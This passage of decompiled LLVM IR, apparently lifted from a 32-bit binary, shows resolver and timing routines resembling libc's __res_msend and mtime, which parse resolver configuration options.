  %v2_804c40d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804c40d, i32* @eax, align 4
  %v2_804c417 = call i32 @__clock_gettime(i32 0, i32 %v2_804c40d)
  %v4_804c41c = sext i16 %tmp20 to i32
  %v2_804c425 = udiv i32 %v4_804c41c, 65536
  %v2_804c428 = add nsw i32 %v2_804c425, %v4_804c41c
  %v1_804c430 = urem i32 %v2_804c428, 65536
  %div = udiv i32 %v1_804c430, 256
  store i32 %div, i32* %stack_var_-304, align 4
  %v3_804c451 = inttoptr i32 %arg5 to i8*
  %v4_804c451 = call i32 @memcpy(i8* %v3_804c451, i32 %v2_804c383, i32 %v3_804c32d)
  %v0_804c464.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c45e

dec_label_pc_804c45b:                             ; preds = %dec_label_pc_804c3cd, %dec_label_pc_804c369, %dec_label_pc_804c358, %dec_label_pc_804c34a, %dec_label_pc_804c33d, %dec_label_pc_804c320
  br label %dec_label_pc_804c45e

dec_label_pc_804c45e:                             ; preds = %dec_label_pc_804c3f5, %dec_label_pc_804c45b
  %v0_804c464 = phi i32 [ %v0_804c464.pre, %dec_label_pc_804c3f5 ], [ -1, %dec_label_pc_804c45b ]
  %v2_804c466 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c466, i32* @ebx, align 4
  store i32 %v0_804c2ea, i32* @esi, align 4
  store i32 %v0_804c2e9, i32* @edi, align 4
  store i32 %v0_804c2e8, i32* @ebp, align 4
  ret i32 %v0_804c464

; uselistorder directives
  uselistorder i32 %v4_804c41c, { 1, 0 }
  uselistorder i32 %v6_804c3c152, { 1, 0 }
  uselistorder i8 %v2_804c3c149, { 1, 2, 0 }
  uselistorder i32 %v2_804c3ef, { 1, 0 }
  uselistorder i32 %v3_804c3fc67, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_804c3db.lcssa, { 1, 0 }
  uselistorder i32 %v1_804c3c0, { 1, 0, 2 }
  uselistorder i32 %v2_804c383, { 1, 0, 2 }
  uselistorder i32 %v3_804c32d, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804c32d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-304, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32 13, { 2, 0, 3, 4, 1 }
  uselistorder i32 (i32, i32)* @strnlen, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c45e, { 1, 0 }
  uselistorder label %dec_label_pc_804c3ef, { 1, 0 }
  uselistorder label %dec_label_pc_804c3cd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c320, { 1, 0 }
}

define i32 @cleanup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  store i32 6, i32* @eax, align 4
  %v1_804c475 = call i32 @__vsyscall(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804c475
}

define i32 @mtime() local_unnamed_addr {
entry:
  %tmp = call i64 @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i64, align 8
  %v2_804c47e = ptrtoint i64* %stack_var_-8 to i32
  store i32 %v2_804c47e, i32* @eax, align 4
  %v2_804c485 = call i32 @__clock_gettime(i32 0, i32 %v2_804c47e)
  %v4_804c48a = trunc i64 %tmp to i32
  store i32 1000000, i32* @ecx, align 4
  %v1_804c495 = ashr i32 %v4_804c48a, 31
  %v2_804c496 = and i64 %tmp, 4294967295
  %v4_804c496 = zext i32 %v1_804c495 to i64
  %v5_804c496 = mul nuw i64 %v4_804c496, 4294967296
  %v6_804c496 = or i64 %v5_804c496, %v2_804c496
  %v8_804c496 = sdiv i64 %v6_804c496, 1000000
  %v9_804c496 = trunc i64 %v8_804c496 to i32
  %v4_804c498 = load i64, i64* %stack_var_-8, align 8
  %v7_804c498 = mul nsw i64 %v4_804c498, 1000
  %v8_804c498 = trunc i64 %v7_804c498 to i32
  %v2_804c4a3 = add i32 %v8_804c498, %v9_804c496
  ret i32 %v2_804c4a3

; uselistorder directives
  uselistorder i64* %stack_var_-8, { 1, 0 }
  uselistorder i64 %tmp, { 1, 0 }
}

define i32 @__res_msend(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-648 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-716 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v15_804c4ac = ptrtoint i32* %stack_var_-716 to i32
  store i1 false, i1* @df, align 1
  %v2_804c4b3 = ptrtoint i32* %stack_var_-80 to i32
  store i32 0, i32* %stack_var_-80, align 4
  %v6_804c4ba = add i32 %v2_804c4b3, 4
  store i32 %v6_804c4ba, i32* %edi.global-to-local, align 4
  %v2_804c4bb = inttoptr i32 %v6_804c4ba to i32*
  store i32 0, i32* %v2_804c4bb, align 4
  %v3_804c4bb = load i32, i32* %edi.global-to-local, align 4
  %v6_804c4bb = add i32 %v3_804c4bb, 4
  store i32 %v6_804c4bb, i32* %edi.global-to-local, align 4
  %v0_804c4bc = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4bc = inttoptr i32 %v6_804c4bb to i32*
  store i32 %v0_804c4bc, i32* %v2_804c4bc, align 4
  %v3_804c4bc = load i32, i32* %edi.global-to-local, align 4
  %v6_804c4bc = add i32 %v3_804c4bc, 4
  store i32 %v6_804c4bc, i32* %edi.global-to-local, align 4
  %v0_804c4bd = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4bd = inttoptr i32 %v6_804c4bc to i32*
  store i32 %v0_804c4bd, i32* %v2_804c4bd, align 4
  %v3_804c4bd = load i32, i32* %edi.global-to-local, align 4
  %v6_804c4bd = add i32 %v3_804c4bd, 4
  store i32 %v6_804c4bd, i32* %edi.global-to-local, align 4
  %v0_804c4be = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4be = inttoptr i32 %v6_804c4bd to i32*
  store i32 %v0_804c4be, i32* %v2_804c4be, align 4
  %v3_804c4be = load i32, i32* %edi.global-to-local, align 4
  %v6_804c4be = add i32 %v3_804c4be, 4
  store i32 %v6_804c4be, i32* %edi.global-to-local, align 4
  %v0_804c4bf = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4bf = inttoptr i32 %v6_804c4be to i32*
  store i32 %v0_804c4bf, i32* %v2_804c4bf, align 4
  %v3_804c4bf = load i32, i32* %edi.global-to-local, align 4
  %v6_804c4bf = add i32 %v3_804c4bf, 4
  store i32 %v6_804c4bf, i32* %edi.global-to-local, align 4
  %v0_804c4c0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4c0 = inttoptr i32 %v6_804c4bf to i32*
  store i32 %v0_804c4c0, i32* %v2_804c4c0, align 4
  %v3_804c4c0 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c4c0 = add i32 %v3_804c4c0, 4
  store i32 %v6_804c4c0, i32* @edi, align 4
  %v2_804c4c1 = ptrtoint i32* %stack_var_-256 to i32
  store i32 %v2_804c4c1, i32* %eax.global-to-local, align 4
  %v3_804c4ce = bitcast i32* %stack_var_-256 to i8*
  %v4_804c4ce = call i32 @memset(i8* %v3_804c4ce, i32 0, i32 84)
  store i32 %v2_804c4c1, i32* @edx, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804c4d5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804c4d5, i32* %eax.global-to-local, align 4
  %v3_804c4df = call i32 @__pthread_setcancelstate(i32 1, i32* nonnull %stack_var_-20)
  %v2_804c4e9 = ptrtoint i32* %stack_var_-648 to i32
  %v2_804c4ee = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_804c4ee, i32* %eax.global-to-local, align 4
  %v6_804c4fb = call i32 @__fopen_rb_ca(i32 ptrtoint ([17 x i8]* @global_var_8054558.352 to i32), i32* nonnull %stack_var_-392, i32 %v2_804c4e9, i32 256)
  store i32 %v6_804c4fb, i32* %eax.global-to-local, align 4
  %v1_804c503 = icmp eq i32 %v6_804c4fb, 0
  store i32 %v6_804c4fb, i32* @ebp, align 4
  store i32 2, i32* @edi, align 4
  br i1 %v1_804c503, label %dec_label_pc_804c7bd, label %dec_label_pc_804c77f

dec_label_pc_804c537:                             ; preds = %dec_label_pc_804c77f
  %v2_804c537 = add i32 %v0_804c790, 12
  %v3_804c537 = inttoptr i32 %v2_804c537 to i32*
  store i32 %v4_804c78b, i32* %v3_804c537, align 4
  %v1_804c538 = add i32 %v0_804c790, 8
  %v2_804c538 = inttoptr i32 %v1_804c538 to i32*
  store i32 7, i32* %v2_804c538, align 4
  %v1_804c53a = add i32 %v0_804c790, 4
  %v2_804c53a = inttoptr i32 %v1_804c53a to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8054569.353 to i32), i32* %v2_804c53a, align 4
  %v1_804c53f = add i32 %v0_804c790, 560
  store i32 %v1_804c53f, i32* %eax.global-to-local, align 4
  %v3_804c546 = inttoptr i32 %v0_804c790 to i32*
  store i32 %v1_804c53f, i32* %v3_804c546, align 4
  %v0_804c547 = call i32 @strncmp()
  store i32 %v0_804c547, i32* %eax.global-to-local, align 4
  %v0_804c54c = load i32, i32* @esp, align 4
  %v1_804c54f = icmp eq i32 %v0_804c547, 0
  %v1_804c551 = icmp eq i1 %v1_804c54f, false
  br i1 %v1_804c551, label %dec_label_pc_804c631, label %dec_label_pc_804c557

dec_label_pc_804c557:                             ; preds = %dec_label_pc_804c537
  %v1_804c557 = add i32 %v0_804c54c, 567
  %v2_804c557 = inttoptr i32 %v1_804c557 to i8*
  %v3_804c557 = load i8, i8* %v2_804c557, align 1
  %v4_804c557 = sext i8 %v3_804c557 to i32
  store i32 %v4_804c557, i32* %eax.global-to-local, align 4
  %v6_804c55f = icmp eq i8 %v3_804c557, 32
  br i1 %v6_804c55f, label %dec_label_pc_804c570, label %dec_label_pc_804c564

dec_label_pc_804c564:                             ; preds = %dec_label_pc_804c557
  %v1_804c564 = add nsw i32 %v4_804c557, -9
  store i32 %v1_804c564, i32* %eax.global-to-local, align 4
  %v5_804c567 = icmp ult i32 %v1_804c564, 4
  %v9_804c567 = icmp eq i8 %v3_804c557, 13
  %v2_804c56a = or i1 %v9_804c567, %v5_804c567
  br i1 %v2_804c56a, label %dec_label_pc_804c570, label %dec_label_pc_804c631

dec_label_pc_804c570:                             ; preds = %dec_label_pc_804c564, %dec_label_pc_804c557
  %v0_804c570 = phi i32 [ %v1_804c564, %dec_label_pc_804c564 ], [ %v4_804c557, %dec_label_pc_804c557 ]
  %v2_804c570 = add i32 %v0_804c54c, 12
  %v3_804c570 = inttoptr i32 %v2_804c570 to i32*
  store i32 %v0_804c570, i32* %v3_804c570, align 4
  %v0_804c571 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c571 = add i32 %v0_804c54c, 8
  %v3_804c571 = inttoptr i32 %v2_804c571 to i32*
  store i32 %v0_804c571, i32* %v3_804c571, align 4
  %v1_804c572 = add i32 %v0_804c54c, 4
  %v2_804c572 = inttoptr i32 %v1_804c572 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8054571.354 to i32), i32* %v2_804c572, align 4
  %v1_804c577 = add i32 %v0_804c54c, 560
  store i32 %v1_804c577, i32* %edx.global-to-local, align 4
  %v3_804c57e = inttoptr i32 %v0_804c54c to i32*
  store i32 %v1_804c577, i32* %v3_804c57e, align 4
  %v5_804c57f = call i32 @strstr(i32 0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c57f, i32* %eax.global-to-local, align 4
  %v0_804c584 = load i32, i32* @esp, align 4
  %v1_804c587 = icmp eq i32 %v5_804c57f, 0
  br i1 %v1_804c587, label %dec_label_pc_804c5ce, label %dec_label_pc_804c58b

dec_label_pc_804c58b:                             ; preds = %dec_label_pc_804c570
  %v1_804c58b = add i32 %v5_804c57f, 8
  store i32 %v1_804c58b, i32* @ebx, align 4
  %v2_804c58e = inttoptr i32 %v1_804c58b to i8*
  %v3_804c58e = load i8, i8* %v2_804c58e, align 1
  %v4_804c58e = sext i8 %v3_804c58e to i32
  %v1_804c592 = add nsw i32 %v4_804c58e, -48
  store i32 %v1_804c592, i32* %eax.global-to-local, align 4
  %v6_804c598 = icmp ugt i32 %v1_804c592, 9
  br i1 %v6_804c598, label %dec_label_pc_804c5ce, label %dec_label_pc_804c59a

dec_label_pc_804c59a:                             ; preds = %dec_label_pc_804c58b
  %v2_804c59a = add i32 %v0_804c584, 12
  %v3_804c59a = inttoptr i32 %v2_804c59a to i32*
  store i32 %v1_804c592, i32* %v3_804c59a, align 4
  %v1_804c59b = add i32 %v0_804c584, 8
  %v2_804c59b = inttoptr i32 %v1_804c59b to i32*
  store i32 10, i32* %v2_804c59b, align 4
  %v1_804c59d = add i32 %v0_804c584, 708
  store i32 %v1_804c59d, i32* %ecx.global-to-local, align 4
  %v2_804c5a4 = add i32 %v0_804c584, 4
  %v3_804c5a4 = inttoptr i32 %v2_804c5a4 to i32*
  store i32 %v1_804c59d, i32* %v3_804c5a4, align 4
  %v0_804c5a5 = load i32, i32* @ebx, align 4
  %v3_804c5a5 = inttoptr i32 %v0_804c584 to i32*
  store i32 %v0_804c5a5, i32* %v3_804c5a5, align 4
  %v4_804c5a6 = call i32 @strtoul(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c5a6, i32* %eax.global-to-local, align 4
  %v0_804c5ab = load i32, i32* @esp, align 4
  %v1_804c5ae = add i32 %v0_804c5ab, 708
  %v2_804c5ae = inttoptr i32 %v1_804c5ae to i32*
  %v3_804c5ae = load i32, i32* %v2_804c5ae, align 4
  %v4_804c5ae = load i32, i32* @ebx, align 4
  %v15_804c5ae = icmp eq i32 %v3_804c5ae, %v4_804c5ae
  br i1 %v15_804c5ae, label %dec_label_pc_804c5ce, label %dec_label_pc_804c5b7

dec_label_pc_804c5b7:                             ; preds = %dec_label_pc_804c59a
  %v1_804c5ba = add i32 %v0_804c5ab, 36
  %v2_804c5ba = inttoptr i32 %v1_804c5ba to i32*
  store i32 30000, i32* %v2_804c5ba, align 4
  %v6_804c5c2 = icmp ugt i32 %v4_804c5a6, 29
  br i1 %v6_804c5c2, label %dec_label_pc_804c5ce, label %dec_label_pc_804c5c4

dec_label_pc_804c5c4:                             ; preds = %dec_label_pc_804c5b7
  %v1_804c5c4 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c5c4 = mul i32 %v1_804c5c4, 1000
  store i32 %v3_804c5c4, i32* %eax.global-to-local, align 4
  %v1_804c5ca = load i32, i32* @esp, align 4
  %v2_804c5ca = add i32 %v1_804c5ca, 20
  %v3_804c5ca = inttoptr i32 %v2_804c5ca to i32*
  store i32 %v3_804c5c4, i32* %v3_804c5ca, align 4
  br label %dec_label_pc_804c5ce

dec_label_pc_804c5ce:                             ; preds = %dec_label_pc_804c5b7, %dec_label_pc_804c59a, %dec_label_pc_804c58b, %dec_label_pc_804c570, %dec_label_pc_804c5c4
  %v0_804c5ce = load i32, i32* %eax.global-to-local, align 4
  %v1_804c5ce = load i32, i32* @esp, align 4
  %v2_804c5ce = add i32 %v1_804c5ce, -4
  %v3_804c5ce = inttoptr i32 %v2_804c5ce to i32*
  store i32 %v0_804c5ce, i32* %v3_804c5ce, align 4
  %v0_804c5cf = load i32, i32* %eax.global-to-local, align 4
  %v2_804c5cf = add i32 %v1_804c5ce, -8
  %v3_804c5cf = inttoptr i32 %v2_804c5cf to i32*
  store i32 %v0_804c5cf, i32* %v3_804c5cf, align 4
  %v1_804c5d0 = add i32 %v1_804c5ce, -12
  %v2_804c5d0 = inttoptr i32 %v1_804c5d0 to i32*
  store i32 ptrtoint ([10 x i8]* @global_var_805457a.355 to i32), i32* %v2_804c5d0, align 4
  %v1_804c5d5 = add i32 %v1_804c5ce, 544
  store i32 %v1_804c5d5, i32* %eax.global-to-local, align 4
  %v2_804c5dc = add i32 %v1_804c5ce, -16
  %v3_804c5dc = inttoptr i32 %v2_804c5dc to i32*
  store i32 %v1_804c5d5, i32* %v3_804c5dc, align 4
  %v5_804c5dd = call i32 @strstr(i32 0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c5dd, i32* %eax.global-to-local, align 4
  %v0_804c5e2 = load i32, i32* @esp, align 4
  %v1_804c5e5 = icmp eq i32 %v5_804c5dd, 0
  br i1 %v1_804c5e5, label %dec_label_pc_804c631, label %dec_label_pc_804c5e9

dec_label_pc_804c5e9:                             ; preds = %dec_label_pc_804c5ce
  %v1_804c5e9 = add i32 %v5_804c5dd, 9
  store i32 %v1_804c5e9, i32* @ebx, align 4
  %v2_804c5ec = inttoptr i32 %v1_804c5e9 to i8*
  %v3_804c5ec = load i8, i8* %v2_804c5ec, align 1
  %v4_804c5ec = sext i8 %v3_804c5ec to i32
  %v1_804c5f0 = add nsw i32 %v4_804c5ec, -48
  store i32 %v1_804c5f0, i32* %eax.global-to-local, align 4
  %v6_804c5f6 = icmp ugt i32 %v1_804c5f0, 9
  br i1 %v6_804c5f6, label %dec_label_pc_804c631, label %dec_label_pc_804c5f8

dec_label_pc_804c5f8:                             ; preds = %dec_label_pc_804c5e9
  %v2_804c5f8 = add i32 %v0_804c5e2, 12
  %v3_804c5f8 = inttoptr i32 %v2_804c5f8 to i32*
  store i32 %v1_804c5f0, i32* %v3_804c5f8, align 4
  %v1_804c5f9 = add i32 %v0_804c5e2, 8
  %v2_804c5f9 = inttoptr i32 %v1_804c5f9 to i32*
  store i32 10, i32* %v2_804c5f9, align 4
  %v1_804c5fb = add i32 %v0_804c5e2, 708
  store i32 %v1_804c5fb, i32* %edx.global-to-local, align 4
  %v2_804c602 = add i32 %v0_804c5e2, 4
  %v3_804c602 = inttoptr i32 %v2_804c602 to i32*
  store i32 %v1_804c5fb, i32* %v3_804c602, align 4
  %v0_804c603 = load i32, i32* @ebx, align 4
  %v3_804c603 = inttoptr i32 %v0_804c5e2 to i32*
  store i32 %v0_804c603, i32* %v3_804c603, align 4
  %v4_804c604 = call i32 @strtoul(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c604, i32* %eax.global-to-local, align 4
  %v0_804c609 = load i32, i32* @esp, align 4
  %v1_804c609 = add i32 %v0_804c609, 16
  %v1_804c60c = add i32 %v0_804c609, 708
  %v2_804c60c = inttoptr i32 %v1_804c60c to i32*
  %v3_804c60c = load i32, i32* %v2_804c60c, align 4
  %v4_804c60c = load i32, i32* @ebx, align 4
  %v15_804c60c = icmp eq i32 %v3_804c60c, %v4_804c60c
  br i1 %v15_804c60c, label %dec_label_pc_804c631, label %dec_label_pc_804c615

dec_label_pc_804c615:                             ; preds = %dec_label_pc_804c5f8
  %tmp = icmp ult i32 %v4_804c604, 11
  br i1 %tmp, label %dec_label_pc_804c621, label %dec_label_pc_804c61a

dec_label_pc_804c61a:                             ; preds = %dec_label_pc_804c615
  store i32 10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c62d

dec_label_pc_804c621:                             ; preds = %dec_label_pc_804c615
  %v1_804c621 = icmp eq i32 %v4_804c604, 0
  %v1_804c623 = add i32 %v0_804c609, 40
  %v2_804c623 = inttoptr i32 %v1_804c623 to i32*
  store i32 1, i32* %v2_804c623, align 4
  br i1 %v1_804c621, label %dec_label_pc_804c631, label %dec_label_pc_804c621.dec_label_pc_804c62d_crit_edge

dec_label_pc_804c621.dec_label_pc_804c62d_crit_edge: ; preds = %dec_label_pc_804c621
  %v0_804c62d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804c62d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c62d

dec_label_pc_804c62d:                             ; preds = %dec_label_pc_804c621.dec_label_pc_804c62d_crit_edge, %dec_label_pc_804c61a
  %v1_804c62d = phi i32 [ %v1_804c62d.pre, %dec_label_pc_804c621.dec_label_pc_804c62d_crit_edge ], [ %v1_804c609, %dec_label_pc_804c61a ]
  %v0_804c62d = phi i32 [ %v0_804c62d.pre, %dec_label_pc_804c621.dec_label_pc_804c62d_crit_edge ], [ 10, %dec_label_pc_804c61a ]
  %v2_804c62d = add i32 %v1_804c62d, 24
  %v3_804c62d = inttoptr i32 %v2_804c62d to i32*
  store i32 %v0_804c62d, i32* %v3_804c62d, align 4
  br label %dec_label_pc_804c631

dec_label_pc_804c631:                             ; preds = %dec_label_pc_804c564, %dec_label_pc_804c621, %dec_label_pc_804c5f8, %dec_label_pc_804c5e9, %dec_label_pc_804c5ce, %dec_label_pc_804c537, %dec_label_pc_804c62d
  %v0_804c631 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c631 = load i32, i32* @esp, align 4
  %v2_804c631 = add i32 %v1_804c631, -4
  %v3_804c631 = inttoptr i32 %v2_804c631 to i32*
  store i32 %v0_804c631, i32* %v3_804c631, align 4
  %v1_804c632 = add i32 %v1_804c631, -8
  %v2_804c632 = inttoptr i32 %v1_804c632 to i32*
  store i32 10, i32* %v2_804c632, align 4
  %v1_804c634 = add i32 %v1_804c631, -12
  %v2_804c634 = inttoptr i32 %v1_804c634 to i32*
  store i32 ptrtoint ([11 x i8]* @global_var_8054584.356 to i32), i32* %v2_804c634, align 4
  %v1_804c639 = add i32 %v1_804c631, 544
  store i32 %v1_804c639, i32* %ecx.global-to-local, align 4
  %v2_804c640 = add i32 %v1_804c631, -16
  %v3_804c640 = inttoptr i32 %v2_804c640 to i32*
  store i32 %v1_804c639, i32* %v3_804c640, align 4
  %v0_804c641 = call i32 @strncmp()
  store i32 %v0_804c641, i32* %eax.global-to-local, align 4
  %v0_804c646 = load i32, i32* @esp, align 4
  %v1_804c646 = add i32 %v0_804c646, 16
  %v1_804c649 = icmp eq i32 %v0_804c641, 0
  %v1_804c64b = icmp eq i1 %v1_804c649, false
  br i1 %v1_804c64b, label %dec_label_pc_804c774, label %dec_label_pc_804c651

dec_label_pc_804c651:                             ; preds = %dec_label_pc_804c631
  %v1_804c651 = add i32 %v0_804c646, 570
  %v2_804c651 = inttoptr i32 %v1_804c651 to i8*
  %v3_804c651 = load i8, i8* %v2_804c651, align 1
  %v4_804c651 = sext i8 %v3_804c651 to i32
  store i32 %v4_804c651, i32* %eax.global-to-local, align 4
  %v6_804c659 = icmp eq i8 %v3_804c651, 32
  br i1 %v6_804c659, label %dec_label_pc_804c66a, label %dec_label_pc_804c65e

dec_label_pc_804c65e:                             ; preds = %dec_label_pc_804c651
  %v1_804c65e = add nsw i32 %v4_804c651, -9
  store i32 %v1_804c65e, i32* %eax.global-to-local, align 4
  %v5_804c661 = icmp ult i32 %v1_804c65e, 4
  %v9_804c661 = icmp eq i8 %v3_804c651, 13
  %v2_804c664 = or i1 %v9_804c661, %v5_804c661
  br i1 %v2_804c664, label %dec_label_pc_804c66a, label %dec_label_pc_804c774

dec_label_pc_804c66a:                             ; preds = %dec_label_pc_804c65e, %dec_label_pc_804c651
  %v1_804c66a = add i32 %v0_804c646, 571
  br label %dec_label_pc_804c674

dec_label_pc_804c673:                             ; preds = %dec_label_pc_804c67c, %dec_label_pc_804c674
  %v1_804c673 = add i32 %v0_804c673, 1
  br label %dec_label_pc_804c674

dec_label_pc_804c674:                             ; preds = %dec_label_pc_804c66a, %dec_label_pc_804c673
  %v0_804c673 = phi i32 [ %v1_804c66a, %dec_label_pc_804c66a ], [ %v1_804c673, %dec_label_pc_804c673 ]
  store i32 %v0_804c673, i32* %ecx.global-to-local, align 4
  %v1_804c674 = inttoptr i32 %v0_804c673 to i8*
  %v2_804c674 = load i8, i8* %v1_804c674, align 1
  %v3_804c674 = sext i8 %v2_804c674 to i32
  store i32 %v3_804c674, i32* %eax.global-to-local, align 4
  %v6_804c677 = icmp eq i8 %v2_804c674, 32
  br i1 %v6_804c677, label %dec_label_pc_804c673, label %dec_label_pc_804c67c

dec_label_pc_804c67c:                             ; preds = %dec_label_pc_804c674
  %v1_804c67c = add nsw i32 %v3_804c674, -9
  store i32 %v1_804c67c, i32* %eax.global-to-local, align 4
  %v5_804c67f = icmp ult i32 %v1_804c67c, 4
  %v9_804c67f = icmp eq i8 %v2_804c674, 13
  %v2_804c682 = or i1 %v9_804c67f, %v5_804c67f
  br i1 %v2_804c682, label %dec_label_pc_804c673, label %dec_label_pc_804c689.preheader

dec_label_pc_804c689.preheader:                   ; preds = %dec_label_pc_804c67c
  store i32 %v0_804c673, i32* %edx.global-to-local, align 4
  %v2_804c689178 = load i8, i8* %v1_804c674, align 1
  %v3_804c689179 = zext i8 %v2_804c689178 to i32
  %v5_804c689180 = and i32 %v1_804c67c, -256
  %v6_804c689181 = or i32 %v3_804c689179, %v5_804c689180
  store i32 %v6_804c689181, i32* %eax.global-to-local, align 4
  %v4_804c68b182 = icmp eq i8 %v2_804c689178, 0
  br i1 %v4_804c68b182, label %dec_label_pc_804c69f, label %dec_label_pc_804c68f

dec_label_pc_804c688:                             ; preds = %dec_label_pc_804c697
  %v1_804c688 = add i32 %v0_804c69f184, 1
  store i32 %v1_804c688, i32* %edx.global-to-local, align 4
  %v1_804c689 = inttoptr i32 %v1_804c688 to i8*
  %v2_804c689 = load i8, i8* %v1_804c689, align 1
  %v3_804c689 = zext i8 %v2_804c689 to i32
  %v5_804c689 = and i32 %v1_804c697, -256
  %v6_804c689 = or i32 %v3_804c689, %v5_804c689
  store i32 %v6_804c689, i32* %eax.global-to-local, align 4
  %v4_804c68b = icmp eq i8 %v2_804c689, 0
  br i1 %v4_804c68b, label %dec_label_pc_804c69f, label %dec_label_pc_804c68f

dec_label_pc_804c68f:                             ; preds = %dec_label_pc_804c689.preheader, %dec_label_pc_804c688
  %v2_804c689186 = phi i8 [ %v2_804c689, %dec_label_pc_804c688 ], [ %v2_804c689178, %dec_label_pc_804c689.preheader ]
  %v1_804c689185 = phi i8* [ %v1_804c689, %dec_label_pc_804c688 ], [ %v1_804c674, %dec_label_pc_804c689.preheader ]
  %v0_804c69f184 = phi i32 [ %v1_804c688, %dec_label_pc_804c688 ], [ %v0_804c673, %dec_label_pc_804c689.preheader ]
  %v2_804c68f = sext i8 %v2_804c689186 to i32
  store i32 %v2_804c68f, i32* %eax.global-to-local, align 4
  %v6_804c692 = icmp eq i8 %v2_804c689186, 32
  br i1 %v6_804c692, label %dec_label_pc_804c69f, label %dec_label_pc_804c697

dec_label_pc_804c697:                             ; preds = %dec_label_pc_804c68f
  %v1_804c697 = add nsw i32 %v2_804c68f, -9
  store i32 %v1_804c697, i32* %eax.global-to-local, align 4
  %v5_804c69a = icmp ult i32 %v1_804c697, 4
  %v9_804c69a = icmp eq i8 %v2_804c689186, 13
  %v2_804c69d = or i1 %v9_804c69a, %v5_804c69a
  br i1 %v2_804c69d, label %dec_label_pc_804c69f, label %dec_label_pc_804c688

dec_label_pc_804c69f:                             ; preds = %dec_label_pc_804c688, %dec_label_pc_804c68f, %dec_label_pc_804c697, %dec_label_pc_804c689.preheader
  %v1_804c689.lcssa = phi i8* [ %v1_804c674, %dec_label_pc_804c689.preheader ], [ %v1_804c689185, %dec_label_pc_804c697 ], [ %v1_804c689185, %dec_label_pc_804c68f ], [ %v1_804c689, %dec_label_pc_804c688 ]
  store i8 0, i8* %v1_804c689.lcssa, align 1
  %v0_804c6a2 = load i32, i32* @esi, align 4
  %v1_804c6a2 = load i32, i32* @esp, align 4
  %v2_804c6a2 = add i32 %v1_804c6a2, -4
  %v3_804c6a2 = inttoptr i32 %v2_804c6a2 to i32*
  store i32 %v0_804c6a2, i32* %v3_804c6a2, align 4
  %v1_804c6a3 = add i32 %v1_804c6a2, -8
  %v2_804c6a3 = inttoptr i32 %v1_804c6a3 to i32*
  store i32 0, i32* %v2_804c6a3, align 4
  %v0_804c6a5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c6a5 = add i32 %v1_804c6a2, -12
  %v3_804c6a5 = inttoptr i32 %v2_804c6a5 to i32*
  store i32 %v0_804c6a5, i32* %v3_804c6a5, align 4
  %v1_804c6a6 = add i32 %v1_804c6a2, 608
  store i32 %v1_804c6a6, i32* %eax.global-to-local, align 4
  %v2_804c6ad = add i32 %v1_804c6a2, -16
  %v3_804c6ad = inttoptr i32 %v2_804c6ad to i32*
  store i32 %v1_804c6a6, i32* %v3_804c6ad, align 4
  %v4_804c6ae = call i32 @__lookup_ipliteral(i32* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c6ae, i32* %eax.global-to-local, align 4
  %v0_804c6b3 = load i32, i32* @esp, align 4
  %v1_804c6b3 = add i32 %v0_804c6b3, 16
  %tmp79 = icmp slt i32 %v4_804c6ae, 1
  br i1 %tmp79, label %dec_label_pc_804c774, label %dec_label_pc_804c6be

dec_label_pc_804c6be:                             ; preds = %dec_label_pc_804c69f
  %v1_804c6be = add i32 %v0_804c6b3, 52
  %v2_804c6be = inttoptr i32 %v1_804c6be to i32*
  %v3_804c6be = load i32, i32* %v2_804c6be, align 4
  store i32 %v3_804c6be, i32* %ecx.global-to-local, align 4
  %v1_804c6c2 = add i32 %v0_804c6b3, 476
